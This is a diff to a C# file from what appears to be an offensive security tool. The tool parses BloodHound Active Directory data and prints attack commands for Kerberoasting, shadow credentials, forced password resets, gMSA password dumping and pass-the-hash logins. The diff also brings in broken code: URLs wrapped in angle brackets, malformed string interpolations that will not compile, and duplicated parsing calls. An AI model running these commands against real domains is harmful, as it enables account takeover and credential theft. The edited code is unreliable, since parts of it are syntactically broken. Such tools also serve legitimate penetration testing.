@@ -1,6 +1,5 @@
 using System;
 using System.Collections.Generic;
-using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -8,6 +7,7 @@ using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Threading;
+using Reecon.Color;
 
 namespace Reecon
 {
@@ -95,11 +95,11 @@ namespace Reecon
                 return;
             }
 
-            string profileId = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("objectid").ToString();
+            string profileId = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data").GetProperty("objectid").ToString();
             Console.WriteLine("PID: " + profileId);
 
             // Type
-            string nodeType = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("type").ToString();
+            string nodeType = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data").GetProperty("type").ToString();
             if (nodeType == "User")
             {
                 Console.WriteLine("Type: User");
@@ -134,7 +134,7 @@ namespace Reecon
                             // Console.WriteLine(memberNode.GetProperty("properties").GetProperty("displayname").GetString());
                         }
 
-                        Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Color.Green)} '{userDomain}/{userName}:{"PASSWORD".Recolor(Color.Green)}' -request -k -dc-host {"dc".Recolor(Color.Green)}.{userDomain}");
+                        Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Recolor.Green)} '{userDomain}/{userName}:{"PASSWORD".Recolor(Recolor.Green)}' -request -k -dc-host {"dc".Recolor(Recolor.Green)}.{userDomain}");
                     }
                 }
             }
@@ -148,12 +148,12 @@ namespace Reecon
                 string membershipName = membership.GetProperty("name").GetString() ?? "INVALID - BUG REELIX";
                 if (membershipName.StartsWith("REMOTE MANAGEMENT USERS")) // Any other super important ones?
                 {
-                    Console.WriteLine("Member Of: " + membershipName.Recolor(Color.Green) + " <---- WINRM!!!");
+                    Console.WriteLine("Member Of: " + membershipName.Recolor(Recolor.Green) + " <---- WINRM!!!");
                 }
                 // https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5
                 else if (membershipName.StartsWith("PRE-WINDOWS 2000 COMPATIBLE ACCESS"))
                 {
-                    Console.WriteLine("Member Of: " + membershipName.Recolor(Color.Green) + " <---- Run --pre2k in nxc");
+                    Console.WriteLine("Member Of: " + membershipName.Recolor(Recolor.Green) + " <---- Run --pre2k in nxc");
                 }
                 else
                 {
@@ -169,24 +169,30 @@ namespace Reecon
                 Console.ReadLine();
             }
 
-            (List<NodeItem> parsedNodes, List<RelationshipItem> parsedRelationships) = ParseJsonBlob(ownablesReq.Text);
+            var parsedNodes = ParseJsonBlob(ownablesReq.Text).Nodes;
+            var parsedRelationships = ParseJsonBlob(ownablesReq.Text).Relationships;
 
             List<Node> nodeList = new List<Node>();
             List<Relationship> relationshipList = new List<Relationship>();
 
 
             // Console.WriteLine($"\nParsed Nodes: {parsedNodes.Count}");
-            foreach (NodeItem node in parsedNodes)
+            foreach (var node in parsedNodes)
             {
-                Node thisNode = new Node(int.Parse(node.OriginalKey ?? "Break"), node.Data?.Name ?? "Unknown Name - Bug Reelix", node.Data?.ObjectId ?? "Unknown Id - Bug Reelix",
-                    node.Data?.NodeType ?? "Unknown Type - Bug Reelix");
+                Node thisNode = new Node(int.Parse(node["key"] ?? "Break"),
+                    node.TryGetValue("data_name", out var name) && name != null ? name : "Unknown Name - Bug Reelix",
+                    node.TryGetValue("data_objectid", out var oid) && oid != null ? oid : "Unknown Id - Bug Reelix",
+                    node.TryGetValue("data_nodetype", out var nt) && nt != null ? nt : "Unknown Type - Bug Reelix");
                 nodeList.Add(thisNode);
             }
 
             // Console.WriteLine($"\nParsed Relationships: {parsedRelationships.Count}");
-            foreach (RelationshipItem rel in parsedRelationships)
+            foreach (var rel in parsedRelationships)
             {
-                Relationship thisRelationship = new Relationship(rel.LabelInfo?.Text ?? "", int.Parse(rel.Id1 ?? "Break"), int.Parse(rel.Id2 ?? "Break"));
+                Relationship thisRelationship = new Relationship(
+                    rel.TryGetValue("label_text", out var lt) && lt != null ? lt : "",
+                    int.Parse(rel["id1"] ?? "Break"),
+                    int.Parse(rel["id2"] ?? "Break"));
                 relationshipList.Add(thisRelationship);
             }
 
@@ -255,7 +261,7 @@ namespace Reecon
             // https://bloodhound.specterops.io/resources/edges/overview
 
             string ip;
-            
+
             string mainDomain = "";
             if (node1Type == "User")
             {
@@ -291,9 +297,9 @@ namespace Reecon
             //
             // Users
             //
-            
+
             // Most of these would technically apply to GenericAll as well
-            
+
             // The User has GenericWrite to another User
 
             if (node1Type == "User" && relationshipType == "GenericWrite" && node2Type == "User")
@@ -304,11 +310,11 @@ namespace Reecon
                 // This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN
                 Console.WriteLine($"-- The User {ourUserName} can perform a Shadow Credentuaks attack against {otherUserName}");
                 Console.WriteLine($"--- faketime asdasdasd bloodyAD -d {userDomain} --host dc01.{userDomain} -u '{ourUserName}' -k add shadowCredentials '{otherUserName}'");
-                Console.WriteLine($"---- evil-winrm -i {userDomain} -u '{otherUserName}' -H '{"NTHASH_FROM_ABOVE".Recolor(Color.Green)}'");
+                Console.WriteLine($"---- evil-winrm -i {userDomain} -u '{otherUserName}' -H '{"NTHASH_FROM_ABOVE".Recolor(Recolor.Green)}'");
                 Console.WriteLine($"-- The User {ourUserName} can perform a targeted Kerberoast attack against {otherUserName}");
-                Console.WriteLine($"--- targetedKerberoast.py -d '{userDomain}' -u '{ourUserName}' -p '{"PASSWORD".Recolor(Color.Green)}' --request-user '{otherUserName}'");
+                Console.WriteLine($"--- targetedKerberoast.py -d '{userDomain}' -u '{ourUserName}' -p '{"PASSWORD".Recolor(Recolor.Green)}' --request-user '{otherUserName}'");
             }
-            
+
             // The User has WriteSPN to another User
             if (node1Type == "User" && relationshipType == "WriteSPN" && node2Type == "User")
             {
@@ -316,8 +322,8 @@ namespace Reecon
                 string userDomain = node1Name.Split('@')[1];
                 string otherUserName = node2Name.Split('@')[0];
                 Console.WriteLine($"- The User {ourUserName} can set the SPN of {otherUserName} and grab the hash to crack");
-                Console.WriteLine($"-- bloodyAD --host {"dc".Recolor(Color.Green)}.{userDomain} -d {userDomain} -u {ourUserName} -p '{"PASSWORD".Recolor(Color.Green)}' set object {otherUserName} serviceprincipalname -v 'reelix/{otherUserName}'");
-                Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Color.Green)} '{userDomain}/{ourUserName}:{"PASSWORD".Recolor(Color.Green)}' -request -k -dc-host {"dc".Recolor(Color.Green)}.{userDomain}");
+                Console.WriteLine($"-- bloodyAD --host {"dc".Recolor(Recolor.Green)}.{userDomain} -d {userDomain} -u {ourUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' set object {otherUserName} serviceprincipalname -v 'reelix/{otherUserName}'");
+                Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Recolor.Green)} '{userDomain}/{ourUserName}:{"PASSWORD".Recolor(Recolor.Green)}' -request -k -dc-host {"dc".Recolor(Recolor.Green)}.{userDomain}");
                 Console.WriteLine("-- KRB_AP_ERR_SKEW(Clock skew too great) -> faketime");
             }
 
@@ -329,7 +335,7 @@ namespace Reecon
                 string userDomain = node1Name.Split('@')[1];
                 string groupName = node2Name.Split('@')[0];
                 Console.WriteLine($"- {userDomain} can add themself to {groupName} due to AddSelf permissions.");
-                Console.WriteLine($"-- bloodyAD --host {ip} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} {userName}");
+                Console.WriteLine($"-- bloodyAD --host {ip} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} {userName}");
             }
 
             // The User has WriteOwner over another User
@@ -339,8 +345,8 @@ namespace Reecon
                 string secondUserName = node2Name.Split('@')[0];
                 string domain = node1Name.Split('@')[1];
                 Console.WriteLine($"- {firstUserName} has write ownership over {secondUserName}");
-                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Color.Green)}' add genericAll {secondUserName} {firstUserName}");
-                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Color.Green)}' set password {secondUserName} 'Password123!'");
+                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add genericAll {secondUserName} {firstUserName}");
+                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' set password {secondUserName} 'Password123!'");
             }
 
             //
@@ -355,7 +361,7 @@ namespace Reecon
                 string userName = node2Name.Split('@')[0];
                 Console.WriteLine($"- Members of {groupName} can change the password of {userName}");
                 Console.WriteLine(
-                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{"OWNED-USER".Recolor(Color.Green)}' -p '{"OWNED-USER_PASSWORD".Recolor(Color.Green)}' set password {userName} 'Password123!'");
+                    $"-- bloodyAD -k --host {"dc".Recolor(Recolor.Green)}.{domain} -d {domain} -u '{"OWNED-USER".Recolor(Recolor.Green)}' -p '{"OWNED-USER_PASSWORD".Recolor(Recolor.Green)}' set password {userName} 'Password123!'");
             }
 
             // The Group can read the password of a Computer
@@ -367,10 +373,10 @@ namespace Reecon
                     string domain = node1Name.Split('@')[1];
                     string computerName = node2Name.Split('@')[0];
                     Console.WriteLine($"- Users of Group {groupName} can read the GMSA Passsword of the Computer {computerName}");
-                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Color.Green)}' -p '{"UserPass".Recolor(Color.Green)}' -d '{domain}'");
+                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Recolor.Green)}' -p '{"UserPass".Recolor(Recolor.Green)}' -d '{domain}'");
                 }
             }
-            
+
             if (node1Type == "Group" && relationshipType == "ReadGMSAPassword" && node2Type == "User")
             {
                 {
@@ -379,7 +385,7 @@ namespace Reecon
                     string domain = node1Name.Split('@')[1];
                     string userName = node2Name.Split('@')[0];
                     Console.WriteLine($"- Users of Group {groupName} can read the GMSA Passsword of the User {userName}");
-                    Console.WriteLine($"-- faketime '2026-03-02T21:55:34' nxc ldap {domain} -u '{"UserInGroup".Recolor(Color.Green)}' [-p '{"UserPass".Recolor(Color.Green)}' / --use-kcache] --gmsa");
+                    Console.WriteLine($"-- faketime '2026-03-02T21:55:34' nxc ldap {domain} -u '{"UserInGroup".Recolor(Recolor.Green)}' [-p '{"UserPass".Recolor(Recolor.Green)}' / --use-kcache] --gmsa");
                 }
             }
 
@@ -395,7 +401,7 @@ namespace Reecon
                 string groupName = node2Name.Split('@')[0];
                 Console.WriteLine($"- The Computer {computerName} can add itself to the Group {groupName}");
                 Console.WriteLine(
-                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{computerName}' -p '{"COMPUTER-PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} '{computerName}'");
+                    $"-- bloodyAD -k --host {"dc".Recolor(Recolor.Green)}.{domain} -d {domain} -u '{computerName}' -p '{"COMPUTER-PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} '{computerName}'");
             }
 
             // The Computer can ForceChangePassword of a User
@@ -405,7 +411,7 @@ namespace Reecon
                 string userName = node2Name.Split('@')[0];
                 string domain = node2Name.Split('@')[1];
                 Console.WriteLine($"- {computerName} can change the password of {userName} without knowing it!");
-                Console.WriteLine($"-- net rpc password '{userName}' 'Password123!' -U '{domain}'/'{computerName}'%'{"PASSWORD_OR_HASH".Recolor(Color.Green)}' -S '{domain}' --pw-nt-hash (If applicable)");
+                Console.WriteLine($"-- net rpc password '{userName}' 'Password123!' -U '{domain}'/'{computerName}'%{"PASSWORD_OR_HASH".Recolor(Recolor.Green)}' -S '{domain}' --pw-nt-hash (If applicable)");
             }
 
             /*
@@ -420,7 +426,7 @@ namespace Reecon
                     // NodeItem computerNode = sortedNodes[1];
                     string? domain = groupNodes.Data?.Name?.Split('@')[1];
                     Console.WriteLine("- Interesting Thing Found!");
-                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Color.Green)}' -p '{"UserPass".Recolor(Color.Green)}' -d '{domain}'");
+                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Recolor.Green)}' -p '{"UserPass".Recolor(Recolor.Green)}' -d '{domain}'");
                 }
             }
 
@@ -428,7 +434,7 @@ namespace Reecon
             // https://bloodhound.specterops.io/resources/edges/write-spn
             if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
             {
-            
+
                 if (sortedNodes[0].Data?.NodeType == "User" &&
                     sortedNodes[1].Data?.NodeType == "User" &&
                     sortedRelationships[0].LabelInfo?.Text == "WriteSPN")
@@ -442,7 +448,7 @@ namespace Reecon
                     // https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
                     // Technically this command should be "--request-user 'kerberoastableUser'", but might as well dump all that the user can
                     // Just in case there are others
-                    Console.WriteLine($"-- python3 targetedKerberoast.py -v -d '{domain}' -u '{originUser}' -p '{"PASSWORD_HERE".Recolor(Color.Green)}'");
+                    Console.WriteLine($"-- python3 targetedKerberoast.py -v -d '{domain}' -u '{originUser}' -p '{"PASSWORD_HERE".Recolor(Recolor.Green)}'");
                     Console.WriteLine("-- KRB_AP_ERR_SKEW(Clock skew too great) -> faketime");
                 }
             }
@@ -462,7 +468,7 @@ namespace Reecon
                     string? groupName = groupNode.Data?.Name?.Split('@')[0];
                     Console.WriteLine($"- {userDomain} can add themselves to {groupName} due to AddSelf permissions.");
                     Console.WriteLine(
-                        $"-- bloodyAD --host {"IP".Recolor(Color.Green)} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} {userName}");
+                        $"-- bloodyAD --host {"IP".Recolor(Recolor.Green)} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} {userName}");
                 }
             }
 
@@ -480,7 +486,7 @@ namespace Reecon
                 string? otherUsername = otherUserNode.Data?.Name?.Split('@')[0];
                 Console.WriteLine($"-- {username} can set the password of {otherUsername} without knowing it.");
                 Console.WriteLine(
-                    $"-- rpcclient -U '{username}'%'{"PASSWORD".Recolor(Color.Green)}' {"IP_HERE".Recolor(Color.Green)} -c 'setuserinfo {otherUsername} 23 Password123!'");
+                    $"-- rpcclient -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' {"IP_HERE".Recolor(Recolor.Green)} -c 'setuserinfo {otherUsername} 23 Password123!'");
             }
 
             // User is a member of a group which has GenericWrite to another Group
@@ -499,9 +505,9 @@ namespace Reecon
                     string? userDomain = userNode.Data?.Name?.Split('@')[1];
                     string? groupName = groupNode.Data?.Name?.Split('@')[0];
                     Console.WriteLine(
-                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%'{"PASSWORD".Recolor(Color.Green)}' -S '{userDomain}'");
+                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                     Console.WriteLine(
-                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%'{"PASSWORD".Recolor(Color.Green)}' -S '{userDomain}'");
+                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                 }
             }
 
@@ -521,9 +527,9 @@ namespace Reecon
                     string? userDomain = userNode.Data?.Name?.Split('@')[1];
                     string? groupName = groupNode.Data?.Name?.Split('@')[0];
                     Console.WriteLine(
-                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%'{"PASSWORD".Recolor(Color.Green)}' -S '{userDomain}'");
+                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                     Console.WriteLine(
-                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%'{"PASSWORD".Recolor(Color.Green)}' -S '{userDomain}'");
+                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                 }
             }
 
@@ -542,8 +548,8 @@ namespace Reecon
                         if (relationship.LabelInfo?.Text == "GenericWrite")
                         {
                             string? username = userNode.Data?.Name?.Split('@')[0];
-                            Console.WriteLine($"- certipy shadow auto -u '{"USERNAME".Recolor(Color.Green)}' -p '{"PASSWORD".Recolor(Color.Green)}' -dc-ip IP -account '{username}'");
-                            Console.WriteLine($" -- certipy find -u '{username}' -hashes {"HASH_FROM_ABOVE".Recolor(Color.Green)} -dc-ip IP_HERE -text -vulnerable -stdout");
+                            Console.WriteLine($"- certipy shadow auto -u '{"USERNAME".Recolor(Recolor.Green)}' -p '{"PASSWORD".Recolor(Recolor.Green)}' -dc-ip IP -account '{username}'");
+                            Console.WriteLine($" -- certipy find -u '{username}' -hashes {"HASH_FROM_ABOVE".Recolor(Recolor.Green)} -dc-ip IP_HERE -text -vulnerable -stdout");
                         }
                     }
                 }
@@ -593,7 +599,7 @@ namespace Reecon
             // Use the JWT to create a File Upload Job
             Dictionary<string, string> authHeader = new() { { "Authorization", "Bearer " + jwt } };
             byte[] emptyPost = new byte[1];
-            Web.UploadDataResult fileUploadJob = Web.UploadData($"http://localhost:8080/api/v2/file-upload/start",
+            Web.UploadDataResult fileUploadJob = Web.UploadData($"<http://localhost:8080/api/v2/file-upload/start>",
                 RequestHeaders: authHeader, PostContent: emptyPost);
             if (fileUploadJob.StatusCode != HttpStatusCode.Created)
             {
@@ -609,7 +615,7 @@ namespace Reecon
                 { { "Content-Type", "application/zip" } };
 
             byte[] fileBytes = File.ReadAllBytes(uploadFilePath);
-            Web.UploadDataResult zipUpload = Web.UploadData($"http://localhost:8080/api/v2/file-upload/{jobId}",
+            Web.UploadDataResult zipUpload = Web.UploadData($"<http://localhost:8080/api/v2/file-upload/{jobId}>",
                 RequestHeaders: authHeader, ContentHeaders: zipHeader, PostContent: fileBytes);
 
             if (zipUpload.StatusCode != HttpStatusCode.Accepted)
@@ -620,7 +626,7 @@ namespace Reecon
 
             // Start the Job processing
             Web.UploadDataResult fileUploadComplete = Web.UploadData(
-                $"http://localhost:8080/api/v2/file-upload/{jobId}/end",
+                $"<http://localhost:8080/api/v2/file-upload/{jobId}/end>",
                 RequestHeaders: authHeader, PostContent: emptyPost);
 
             if (fileUploadComplete.StatusCode != HttpStatusCode.OK)
@@ -633,7 +639,7 @@ namespace Reecon
             // Watch the ingesting process until it's completed
 
             // Due to a bug with the API
-            // https://github.com/SpecterOps/BloodHound/issues/1505
+            // <https://github.com/SpecterOps/BloodHound/issues/1505>
             // This is far more complicated than it should be.
             Console.WriteLine($"File Upload finalized with Job ID: {jobId}");
             Console.WriteLine("Data needs to be ingested - This may take awhile.");
@@ -643,7 +649,7 @@ namespace Reecon
             string statusMessage = "";
             while (statusMessage != "Complete") // If it fails. then this loops forever - Never had that yet, so :p
             {
-                string jobData = Web.DownloadString("http://localhost:8080/api/v2/file-upload?id=" + jobId, JWT: jwt).Text;
+                string jobData = Web.DownloadString("<http://localhost:8080/api/v2/file-upload?id=>" + jobId, JWT: jwt).Text;
                 JsonElement.ArrayEnumerator dataArray = JsonDocument.Parse(jobData).RootElement.GetProperty("data").EnumerateArray();
 
                 // Could probably refactor this entire thing to a single LINQ query since all we need is the value that matches the id...
@@ -670,169 +676,96 @@ namespace Reecon
         }
 
         // Here be dragons
-        private static (List<NodeItem> Nodes, List<RelationshipItem> Relationships) ParseJsonBlob(string jsonBlob)
+        private static (List<Dictionary<string, string>> Nodes, List<Dictionary<string, string>> Relationships) ParseJsonBlob(string jsonBlob)
         {
-            List<NodeItem> nodes = [];
-            List<RelationshipItem> relationships = [];
-
-            // Get the default instance of the source-generated context.
-            BloodhoundJsonContext context = BloodhoundJsonContext.Default;
-
-            // Parse the entire JSON into a JsonDocument
-            using (JsonDocument document = JsonDocument.Parse(jsonBlob))
+            var nodes = new List<Dictionary<string, string>>();
+            var relationships = new List<Dictionary<string, string>>();
+            using JsonDocument document = JsonDocument.Parse(jsonBlob);
+            JsonElement root = document.RootElement;
+            foreach (JsonProperty property in root.EnumerateObject())
             {
-                JsonElement root = document.RootElement;
-
-                // Iterate over each property in the root object
-                foreach (JsonProperty property in root.EnumerateObject())
+                string key = property.Name;
+                JsonElement value = property.Value;
+                if (int.TryParse(key, out _)) // Node
                 {
-                    string key = property.Name;
-                    JsonElement valueElement = property.Value;
-
-                    if (int.TryParse(key, out _)) // Check if the key is purely numeric (node)
+                    try
                     {
-                        try
-                        {
-                            // Use the context for deserialization
-                            NodeItem? node = valueElement.Deserialize(context.NodeItem);
-                            if (node != null)
-                            {
-                                node.OriginalKey = key; // Store the original key
-                                nodes.Add(node);
-                            }
-                        }
-                        catch (JsonException ex)
-                        {
-                            Console.WriteLine($"Error deserializing node with key '{key}': {ex.Message}");
-                        }
+                        nodes.Add(ParseNode(value, key));
                     }
-                    else if (key.StartsWith("rel_", StringComparison.OrdinalIgnoreCase)) // Relationship
+                    catch (JsonException ex)
                     {
-                        try
-                        {
-                            // Use the context for deserialization
-                            RelationshipItem? rel = valueElement.Deserialize(context.RelationshipItem);
-                            if (rel != null)
-                            {
-                                rel.OriginalKey = key; // Store the original key
-                                relationships.Add(rel);
-                            }
-                        }
-                        catch (JsonException ex)
-                        {
-                            Console.WriteLine($"Error deserializing relationship with key '{key}': {ex.Message}");
-                        }
+                        Console.WriteLine($"Error deserializing node with key '{key}': {ex.Message}");
                     }
-                    else
+                }
+                else if (key.StartsWith("rel_", StringComparison.OrdinalIgnoreCase)) // Relationship
+                {
+                    try
                     {
-                        // You might want to log or handle other top-level keys if they are expected
-                        // For example, BloodHound JSON can have a "meta" key or "nodes"/"edges" at the root
-                        // depending on the API endpoint or export format.
-                        // The current logic assumes a flat structure of numerically-keyed nodes
-                        // and "rel_"-prefixed relationships directly under the root object.
-                        // Console.WriteLine($"Skipping unrecognized top-level key: {key}");
+                        relationships.Add(ParseRelationship(value, key));
+                    }
+                    catch (JsonException ex)
+                    {
+                        Console.WriteLine($"Error deserializing relationship with key '{key}': {ex.Message}");
                     }
                 }
             }
 
             return (nodes, relationships);
         }
-    }
 
-    // Define the JSON context with source generation
-    [JsonSourceGenerationOptions(WriteIndented = true, PropertyNameCaseInsensitive = true)]
-    [JsonSerializable(typeof(NodeDataItem))]
-    [JsonSerializable(typeof(NodeBorder))]
-    [JsonSerializable(typeof(NodeFontIcon))]
-    [JsonSerializable(typeof(NodeLabel))]
-    [JsonSerializable(typeof(NodeItem))]
-    [JsonSerializable(typeof(RelationshipEnd2))]
-    [JsonSerializable(typeof(RelationshipLabel))]
-    [JsonSerializable(typeof(RelationshipItem))]
-    public partial class BloodhoundJsonContext : JsonSerializerContext
-    {
-    }
+        private static Dictionary<string, string> ParseNode(JsonElement element, string originalKey)
+        {
+            var dict = new Dictionary<string, string>();
+            dict["key"] = originalKey;
+            if (element.TryGetProperty("color", out JsonElement p)) dict["color"] = p.GetString() ?? "";
+            if (element.TryGetProperty("size", out p)) dict["size"] = p.GetInt32().ToString();
+            if (element.TryGetProperty("data", out JsonElement dataProp) && dataProp.ValueKind == JsonValueKind.Object)
+            {
+                if (dataProp.TryGetProperty("name", out JsonElement n)) dict["data_name"] = n.GetString() ?? "";
+                if (dataProp.TryGetProperty("nodetype", out n)) dict["data_nodetype"] = n.GetString() ?? "";
+                if (dataProp.TryGetProperty("objectid", out n)) dict["data_objectid"] = n.GetString() ?? "";
+                if (dataProp.TryGetProperty("system_tags", out n)) dict["data_system_tags"] = n.GetString() ?? "";
+            }
 
-    //
-    // Nodes
-    //
-    public class NodeDataItem
-    {
-        [JsonPropertyName("name")] public string? Name { get; set; }
+            if (element.TryGetProperty("border", out JsonElement border) && border.ValueKind == JsonValueKind.Object)
+            {
+                if (border.TryGetProperty("color", out JsonElement b)) dict["border_color"] = b.GetString() ?? "";
+            }
 
-        [JsonPropertyName("nodetype")] public string? NodeType { get; set; }
+            if (element.TryGetProperty("fontIcon", out JsonElement font) && font.ValueKind == JsonValueKind.Object)
+            {
+                if (font.TryGetProperty("text", out JsonElement f)) dict["fonticon_text"] = f.GetString() ?? "";
+            }
 
-        [JsonPropertyName("objectid")] public string? ObjectId { get; set; }
+            if (element.TryGetProperty("label", out JsonElement label) && label.ValueKind == JsonValueKind.Object)
+            {
+                if (label.TryGetProperty("backgroundColor", out JsonElement l)) dict["label_backgroundcolor"] = l.GetString() ?? "";
+                if (label.TryGetProperty("center", out l)) dict["label_center"] = l.GetBoolean().ToString();
+                if (label.TryGetProperty("fontSize", out l)) dict["label_fontsize"] = l.GetInt32().ToString();
+                if (label.TryGetProperty("text", out l)) dict["label_text"] = l.GetString() ?? "";
+            }
 
-        [JsonPropertyName("system_tags")] public string? SystemTags { get; set; } // Can be null or a string like "owned"
-    }
+            return dict;
+        }
 
-    public class NodeBorder
-    {
-        [JsonPropertyName("color")] public string? Color { get; set; }
-    }
+        private static Dictionary<string, string> ParseRelationship(JsonElement element, string originalKey)
+        {
+            var dict = new Dictionary<string, string>();
+            dict["key"] = originalKey;
+            if (element.TryGetProperty("color", out JsonElement p)) dict["color"] = p.GetString() ?? "";
+            if (element.TryGetProperty("id1", out p)) dict["id1"] = p.GetString() ?? "";
+            if (element.TryGetProperty("id2", out p)) dict["id2"] = p.GetString() ?? "";
+            if (element.TryGetProperty("end2", out JsonElement end) && end.ValueKind == JsonValueKind.Object)
+            {
+                if (end.TryGetProperty("arrow", out JsonElement e)) dict["end2_arrow"] = e.GetBoolean().ToString();
+            }
 
-    public class NodeFontIcon
-    {
-        [JsonPropertyName("text")] public string? Text { get; set; }
-    }
+            if (element.TryGetProperty("label", out JsonElement label) && label.ValueKind == JsonValueKind.Object)
+            {
+                if (label.TryGetProperty("text", out JsonElement l)) dict["label_text"] = l.GetString() ?? "";
+            }
 
-    public class NodeLabel
-    {
-        [JsonPropertyName("backgroundColor")] public string? BackgroundColor { get; set; }
-
-        [JsonPropertyName("center")] public bool Center { get; set; }
-
-        [JsonPropertyName("fontSize")] public int FontSize { get; set; }
-
-        [JsonPropertyName("text")] public string? Text { get; set; }
-    }
-
-    public class NodeItem
-    {
-        // We can add the original key if needed, e.g., "17", "20"
-        [JsonIgnore] // This property is not part of the JSON value itself
-        public string? OriginalKey { get; set; }
-
-        [JsonPropertyName("color")] public string? Color { get; set; }
-
-        [JsonPropertyName("data")] public NodeDataItem? Data { get; set; }
-
-        [JsonPropertyName("border")] public NodeBorder? Border { get; set; }
-
-        [JsonPropertyName("fontIcon")] public NodeFontIcon? FontIcon { get; set; }
-
-        [JsonPropertyName("label")] public NodeLabel? LabelInfo { get; set; } // Renamed to avoid conflict if a property was just 'Label'
-
-        [JsonPropertyName("size")] public int Size { get; set; }
-    }
-
-    //
-    // Relationships
-    // 
-    public class RelationshipEnd2
-    {
-        [JsonPropertyName("arrow")] public bool Arrow { get; set; }
-    }
-
-    public class RelationshipLabel
-    {
-        [JsonPropertyName("text")] public string? Text { get; set; }
-    }
-
-    public class RelationshipItem
-    {
-        // We can add the original key if needed, e.g., "rel_104"
-        [JsonIgnore] public string? OriginalKey { get; set; }
-
-        [JsonPropertyName("color")] public string? Color { get; set; }
-
-        [JsonPropertyName("end2")] public RelationshipEnd2? End2 { get; set; }
-
-        [JsonPropertyName("id1")] public string? Id1 { get; set; }
-
-        [JsonPropertyName("id2")] public string? Id2 { get; set; }
-
-        [JsonPropertyName("label")] public RelationshipLabel? LabelInfo { get; set; } // Renamed
+            return dict;
+        }
     }
 }
